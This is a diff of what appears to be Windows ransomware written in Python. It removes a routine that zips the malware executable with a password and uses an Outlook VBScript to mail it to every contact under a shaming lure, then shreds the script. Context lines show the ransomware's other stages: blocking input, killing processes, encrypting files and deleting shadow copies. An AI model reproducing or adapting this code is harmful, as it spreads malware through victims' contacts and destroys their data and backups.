@@ -28,51 +28,6 @@ def is_admin():
         return False
 
 
-def send_mail():
-    zip_file_path = os.path.join(
-        os.getenv("TEMP"), f"IMG_{random.randint(1000, 9999)}.zip"
-    )
-    with pyzipper.AESZipFile(zip_file_path, "w", compression=pyzipper.ZIP_LZMA) as zf:
-        zf.setpassword(b"memecoder")
-        zf.write(sys.executable)
-    vbs_code = f"""dim x
-on error resume next
-Set fso ="Scripting.FileSystem.Object"
-Set so=CreateObject(fso)
-Set ol=CreateObject("Outlook.Application")
-Set out=WScript.CreateObject("Outlook.Application")
-Set mapi = out.GetNameSpace("MAPI")
-Set a = mapi.AddressLists(1)
-Set ae=a.AddressEntries
-For x=1 To ae.Count
-Set ci=ol.CreateItem(0)
-Set Mail=ci
-Mail.to=ol.GetNameSpace("MAPI").AddressLists(1).AddressEntries(x)
-Mail.Subject="Hello, is this you?"
-Mail.Body="Man that has got to be embarrassing!!! Extraction password: memecoder"
-Mail.Attachments.Add("{zip_file_path}")
-Mail.send
-Next
-ol.Quit
-"""
-    vbs_file_path = os.path.join(os.getenv("TEMP"), "mail.vbs")
-    with open(vbs_file_path, "w") as f:
-        f.write(vbs_code)
-    execute_command(f'start /b "" "{vbs_file_path}"')
-    with open(vbs_file_path, "w") as f:
-        f.write(os.urandom(os.path.getsize(vbs_file_path)))
-    try:
-        os.remove(vbs_file_path)
-    except:
-        pass
-    with open(zip_file_path, "w") as f:
-        f.write(os.urandom(os.path.getsize(vbs_file_path)))
-    try:
-        os.remove(zip_file_path)
-    except:
-        pass
-
-
 def freeze_keyboard():
     ctypes.windll.user32.BlockInput(True)
 
@@ -520,7 +475,6 @@ if __name__ == "__main__":
         freeze_keyboard()
         block_processes()
         disable_all()
-        send_mail()
         start_encryption()
         delete_shadow_copy()
         change_wallpaper()
